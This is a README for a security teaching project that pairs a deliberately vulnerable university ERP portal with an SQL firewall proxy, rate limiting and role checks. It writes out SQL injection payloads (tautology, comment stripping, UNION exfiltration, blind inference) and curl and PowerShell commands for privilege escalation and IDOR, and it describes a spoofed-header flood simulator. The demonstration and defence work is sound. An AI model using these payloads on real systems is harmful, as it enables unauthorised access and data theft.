# DBSHIELD

**DataBase Systems Handling for Injection, Exploitation, Leakage, and DoS**

A security research platform that engineers and defends against three classes of real-world database attacks on a realistic university ERP portal. The project goes beyond standard treatments by implementing a production-grade **AST-parsing SQL firewall proxy** and a **distributed Redis Token Bucket rate limiter** — infrastructure components that are general-purpose and could protect any Python-backed web application.

---

## Architecture

```
React Frontend (port 3000)
        │
        ▼
FastAPI Backend (port 8000)
        │
        ├── DDoS Middleware (IP rate limiter + X-Forwarded-For spoof detection)
        │       └── In-memory sliding window  OR  Redis Token Bucket (distributed)
        │
        ├── SQL Firewall Proxy  ←  wraps every sqlite3 connection
        │       └── AST analysis: tautologies, UNION injections, comment stripping, stacked queries
        │
        └── SQLite Database
```

### Security Infrastructure

| Component | Location | What it does |
|---|---|---|
| **SQL Firewall Proxy** | `backend/sql_injection_prevention/sql_proxy.py` | Wraps sqlite3; AST-parses every query before execution |
| **Redis Token Bucket** | `backend/ddos_prevention/redis_rate_limiter.py` | Atomic Lua/EVALSHA rate limiting across distributed replicas |
| **IP Spoof Detector** | `backend/ddos_prevention/app_protection.py` | Detects X-Forwarded-For spoofing via sliding-window unique-IP tracking |
| **Auth Bypass Guard** | `Authorization Bypass/authorization.py` | Server-side role enforcement on every protected endpoint |

---

## Attack Surface

The ERP portal intentionally exposes three classes of vulnerabilities for demonstration:

1. **SQL Injection** — Login endpoint uses raw string interpolation, enabling tautology bypass (`' OR '1'='1`), UNION exfiltration, and comment-stripping attacks.
2. **Layer-7 DDoS** — Login handler includes an artificial 1s delay; a flood simulator with spoofed `X-Forwarded-For` headers degrades response times for legitimate users.
3. **Authorization Bypass** — JWT tokens carry a role claim but, without server-side enforcement, a student token can call admin and instructor endpoints freely.

---

## Feature Toggles

All features are toggled via the `.env` file in the project root. **No code edits required.**

```env
ENABLE_DB_PROXY=false              # AST SQL Firewall Proxy
ENABLE_SQLI_PROTECTION=false       # Legacy regex SQLi guard (login only)
ENABLE_DDOS_PROTECTION=false       # IP rate limiting + spoof detection
ENABLE_REDIS_RATE_LIMITER=false    # Upgrade: Redis Token Bucket (distributed)
ENABLE_AUTH_BYPASS_PROTECTION=false
```

Restart the backend after any change.

---

## Quick Setup

### 1. Install dependencies

```bash
pip install -r requirements.txt
```

### 2. Seed the database

```bash
python3 database/seed_data.py --rows 20000
```

Creates `database/dbshield.sqlite3` with 20,000 users, 12 courses, enrollments, assignments, and materials.

Default credentials after seeding:

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | Admin |
| `instructor1` | `inst123` | Instructor |
| `instructor2` | `inst456` | Instructor |
| `student1` | `pass1` | Student |
| `studentN` | `passN` | Student |

### 3. Run the backend

```bash
cd backend
uvicorn app:app --reload --host 0.0.0.0 --port 8000
```

### 4. Run the frontend

```bash
cd frontend/frontend
npm install
npm start
```

Open `http://localhost:3000`.

---

## Demo 1 — SQL Injection

### Unshielded (vulnerable)

In `.env`, set:
```env
ENABLE_DB_PROXY=false
ENABLE_SQLI_PROTECTION=false
```

Try logging in with:
- Username: `' OR '1'='1`
- Password: `' OR '1'='1`

You will be logged in as `admin` without knowing the real password.

Or via curl:
```bash
curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq .
```

Other attack payloads:
```
# Comment stripping
Username: admin' --
Password: anything

# UNION exfiltration
Username: ' UNION SELECT 1,'pwned','pwned@example.com','x','admin','Injected Admin','9999999999' --
Password: anything

# Blind boolean inference
Username: admin' AND LENGTH(password)=8 --
Password: anything
```

Store the token and call an admin-only endpoint:
```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq -r '.token')

curl -s -X POST http://localhost:8000/api/admin/action \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT username, role FROM users LIMIT 5"}' | jq .
```

### Shielded — AST Firewall Proxy

In `.env`, set:
```env
ENABLE_DB_PROXY=true
```

Every query now passes through the AST firewall before reaching the database — not just login. The proxy detects:
- **Tautologies** — `OR 1=1`, `OR 'a'='a'`
- **UNION injections** — any `UNION` / `UNION ALL` not in the pre-registered template whitelist
- **Comment stripping** — `--`, `/* */`
- **Stacked queries** — semicolon-separated multi-statement attacks

The whitelist uses **SHA-256 hashing of structural query skeletons** (literals stripped). Only queries whose structural hash matches a registered template are executed.

### Run the test suite

```bash
python -m pytest backend/sql_injection_prevention/tests/ -v
```

19 tests covering all 4 attack rules and legitimate query pass-through.

---

## Demo 2 — DDoS / Rate Limiting

### Unshielded

In `.env`, set:
```env
ENABLE_DDOS_PROTECTION=false
ENABLE_SQLI_PROTECTION=false
```

Start the simulator:
```bash
cd ddos_attack
python3 ddos_simulator.py
```

The simulator floods `POST /api/login` with randomized credentials and spoofed `X-Forwarded-For` headers. With protection off, every request hits the slow login handler (1s delay) — legitimate browser logins become noticeably sluggish.

### Shielded — In-memory rate limiter

In `.env`, set:
```env
ENABLE_DDOS_PROTECTION=true
ENABLE_REDIS_RATE_LIMITER=false
```

Spoofed requests are blocked in middleware (HTTP 403) before reaching the login handler. Legitimate traffic remains responsive.

**Limitation**: state is per-process. Scale to multiple backend instances and each server independently allows the full rate — an attacker gets `N × limit` effective bandwidth.

### Shielded — Redis Token Bucket (distributed)

In `.env`, set:
```env
ENABLE_DDOS_PROTECTION=true
ENABLE_REDIS_RATE_LIMITER=true
REDIS_URL=redis://localhost:6379
```

Start Redis:
```bash
docker run -p 6379:6379 redis:7-alpine
```

Now run two backend instances in separate terminals:
```bash
# Terminal 1
cd backend && uvicorn app:app --port 8000

# Terminal 2
cd backend && uvicorn app:app --port 8001
```

Run the simulator against port 8000. The combined request count across **both servers** triggers the rate limit — because both read from and write to the **same Redis counter via an atomic Lua script (EVALSHA)**. This eliminates the TOCTOU race condition that a per-process lock cannot prevent.

### Multi-node Docker demo

```bash
docker compose up --build --scale backend=3
```

Spins up Redis + 3 FastAPI replicas + Nginx round-robin load balancer. All 3 replicas share one rate limit counter. Run the simulator against port 8000 (Nginx) to observe globally-enforced 429 responses.

---

## Demo 3 — Authorization Bypass

### Unshielded

In `.env`, set:
```env
ENABLE_AUTH_BYPASS_PROTECTION=false
```

#### Bash

```bash
# Login as a student
TOKEN=$(curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"pass1"}' | jq -r '.token')

# Student token -> admin endpoint (should be forbidden, but isn't)
curl -s -X POST http://localhost:8000/api/admin/action \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT username FROM users LIMIT 1"}' | jq .

# Student token -> view another student's grades (IDOR)
curl -X POST http://localhost:8000/api/student/view-grades \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2"}' | jq .

# Student token -> instructor-only endpoints
curl -s -X POST http://localhost:8000/api/instructor/admit-student \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2","course_code":"CS101"}' | jq .

curl -s -X POST http://localhost:8000/api/instructor/assign-grade \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2","course_code":"CS101","grade":"F"}' | jq .

curl -s -X POST http://localhost:8000/api/admin/add-student \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"bypassdemo","name":"Bypass Demo","email":"bypassdemo@example.com"}' | jq .
```

All return HTTP 200 — the student token has full admin access.

#### PowerShell

```powershell
$TOKEN = (Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/login" `
  -ContentType "application/json" `
  -Body '{"username":"student1","password":"pass1"}').token

Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/admin/action" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"query":"SELECT username FROM users LIMIT 1"}' | ConvertTo-Json -Depth 10

Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/admin/add-student" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"username":"bypassdemo","name":"Bypass Demo","email":"bypassdemo@example.com"}' | ConvertTo-Json -Depth 10
```

### Shielded

In `.env`, set:
```env
ENABLE_AUTH_BYPASS_PROTECTION=true
```

Every protected endpoint now validates the JWT role claim server-side. The same requests return HTTP 403.

---

## Project Structure

```
DBSHIELD/
├── .env                              # All feature toggles
├── docker-compose.yml                # Multi-node demo stack
├── nginx.conf                        # Round-robin load balancer config
├── requirements.txt
│
├── backend/
│   ├── app.py                        # FastAPI app, env-driven toggle loading
│   ├── database.py                   # connect_to_db() -> SQLFirewallProxy
│   ├── Dockerfile
│   │
│   ├── sql_injection_prevention/
│   │   ├── sql_proxy.py              # AST firewall proxy (Feature 1)
│   │   ├── secure_auth.py            # Parameterised login (legacy)
│   │   ├── secure_erp_placeholders.py
│   │   └── tests/
│   │       └── test_sql_proxy.py     # 19 unit tests
│   │
│   └── ddos_prevention/
│       ├── app_protection.py         # Middleware + spoof detector + factory
│       ├── rate_limiter.py           # In-memory sliding-window limiter
│       ├── redis_rate_limiter.py     # Redis Token Bucket limiter (Feature 2)
│       └── config.py
│
├── database/
│   ├── seed_data.py
│   └── tables.sql
│
├── frontend/
│   └── frontend/                     # React app
│
├── ddos_attack/
│   └── ddos_simulator.py             # Flood simulator with IP spoofing
│
├── sqli_attack/                      # SQLi attack scripts
└── Authorization Bypass/             # Auth bypass module
```